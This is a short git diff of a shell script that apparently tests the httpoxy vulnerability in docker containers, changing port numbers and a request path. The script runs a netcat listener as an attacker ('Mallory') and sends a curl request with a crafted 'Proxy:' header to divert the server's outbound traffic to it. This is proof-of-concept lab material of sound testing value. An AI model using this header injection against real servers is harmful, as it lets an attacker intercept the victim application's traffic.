@@ -19,11 +19,11 @@ IMAGE_WSGI=python-httpoxy-poc-wsgi:latest
 MALLORY_LISTENER_PORT=12345
 
 if [ -z $TEST_PORT_CGI ]; then
-    TEST_PORT_CGI=2081
+    TEST_PORT_CGI=2083
 fi
 
 if [ -z $TEST_PORT_WSGI ]; then
-    TEST_PORT_WSGI=2083
+    TEST_PORT_WSGI=2084
 fi
 
 echo "Building docker container for cgi"
@@ -68,7 +68,7 @@ echo "Testing: cgi/apache..."
 echo "" > ./cgi-mallory.log
 nc -v -l 12345 > ./cgi-mallory.log 2>&1 &
 sleep 2
-curl -X GET -H "Proxy: $DOCKER_HOST_IP:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_CGI/server.cgi > ./cgi-curl.log 2>&1
+curl -X GET -H "Proxy: $DOCKER_HOST_IP:$MALLORY_LISTENER_PORT" http://$DOCKER_IP:$TEST_PORT_CGI/httpoxy > ./cgi-curl.log 2>&1
 pkill -f 'nc -v -l 12345'
 echo "Testing done."
 
